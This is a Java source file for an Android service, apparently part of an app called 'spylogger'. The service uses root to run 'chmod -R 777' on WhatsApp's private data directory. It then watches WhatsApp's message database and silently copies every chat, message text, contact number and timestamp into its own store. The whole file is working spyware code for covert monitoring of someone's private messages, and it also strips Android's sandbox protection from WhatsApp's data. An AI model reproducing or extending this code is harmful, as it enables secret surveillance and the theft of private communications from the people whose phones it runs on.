package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
import com.gravatasufoca.spylogger.model.whatsapp.Messages;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.stmt.QueryBuilder;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class WhatsAppService extends Service {

	private String pathToWatch;
	private String inFileName;
	private DatabaseHelperExternal external;
	private Dao<ChatList, Integer> daoChatExternal;
	private Dao<Messages, Integer> daoMsgExternal;

	private DatabaseHelper dbHelper;

	private final IBinder mBinder = new LocalBinder();

	public class LocalBinder extends Binder {
		WhatsAppService getService() {
			return WhatsAppService.this;
		}
	}

	public WhatsAppService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}

	private void chmod() {

		try{
			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
					+ android.os.Environment.getDataDirectory().toString()
					+ "/data/com.whatsapp", "chmod -R 777 "
					+ getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
			RootTools.getShell(true).add(command);
		}catch(Exception e){
			e.printStackTrace();
		}

	}

	@Override
	public void onCreate() {

		pathToWatch = android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp/databases/msgstore.db";

		chmod();
		try {
			inFileName = getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
					+ "/databases/"+ DatabaseHelper.DATABASE_NAME;
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}


	}


	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
		Utils.context=getApplicationContext();
		updateMsg();

		if(Utils.whatsObserver==null)
			setObserver();

		Log.d("WHATSLOG - OBSESRVER", Utils.whatsObserver.toString());

		return START_REDELIVER_INTENT;
	}

	private void setObserver(){
		Utils.whatsObserver = new FileObserver(pathToWatch) { // set up a file observer to
			// watch this directory on
			// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
					case FileObserver.MODIFY:
						Log.d("DEBUG", "MODIFY:" + pathToWatch + file);

						updateMsg();
						break;
					default:
						// just ignore
						break;
				}

			}
		};
		Utils.whatsObserver.startWatching(); // START OBSERVING
	}

	private void updateMsg() {
		external = new DatabaseHelperExternal(getApplicationContext());
		dbHelper = new DatabaseHelper((getApplicationContext()));

		try {
			dbHelper.getWritableDatabase();
			daoMsgExternal = external.getMessagesDao();
			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");


			GenericRawResults<String[]> raws= daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,sort_timestamp from chat_list where _id!=-1 and _id not in( select idReferencia from localdb.topico )");
			List<Topico> topicos=new ArrayList<>();

			for(String[] resultRaw:raws){
				Topico topico=new Topico.TopicoBuilder()
						.setIdReferencia(resultRaw[1])
						.setNome(resultRaw[2])
						.setGrupo(resultRaw[2]!=null && !resultRaw[2].isEmpty())
						.build();

				topicos.add(topico);
			}
			dbHelper.getDao(Topico.class).create(topicos);

			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem )");
			List<Mensagem> mensagems=new ArrayList<>();
			for(final String[] resultRaw:rawResults){
				Topico tmpTopico=null;
				for(Topico topico: topicos) {
					if(topico.getIdReferencia().equals(resultRaw[1])) {
						tmpTopico=topico;
						break;
					}
				}

				Mensagem mensagem = new Mensagem.MensagemBuilder()
						.setIdReferencia(resultRaw[0])
						.setRemetente(resultRaw[2].equals("1"))
						.setTexto(resultRaw[3])
						.setData(new Date(Long.parseLong(resultRaw[4])))
						.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
						.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
						.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
						.setMediaMime(resultRaw[10])
//						.setContato(Utils.getContactDisplayNameByNumber(resultRaw[7],getContentResolver()))
						.setContato(resultRaw[7]!=null ? resultRaw[7]:resultRaw[1])
						.setTopico(tmpTopico)
						.setTemMedia(resultRaw[9] == "1").build(TipoMensagem.WHATSAPP);

				if(resultRaw[7]!=null){
					if(resultRaw[7].indexOf("@")!=-1){
						mensagem.setNumeroContato(resultRaw[7].substring(0,resultRaw[7].indexOf("@")));
					}else{
						mensagem.setNumeroContato(resultRaw[7]);
					}
				}else{
					if(resultRaw[1].indexOf("@")!=-1){
						mensagem.setNumeroContato(resultRaw[1].substring(0,resultRaw[1].indexOf("@")));
					}else{
						mensagem.setNumeroContato(resultRaw[1]);
					}
				}

				if(tmpTopico==null){
					QueryBuilder<Topico,Integer> qb= (QueryBuilder<Topico, Integer>) dbHelper.getDao(Topico.class).queryBuilder();
					qb.where().eq("idReferencia",resultRaw[1]);
					tmpTopico=dbHelper.getDao(Topico.class).queryForFirst(qb.prepare());
					mensagem.setTopico(tmpTopico);
				}
				mensagems.add(mensagem);
			}

			dbHelper.getDao(Mensagem.class).create(mensagems);


		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}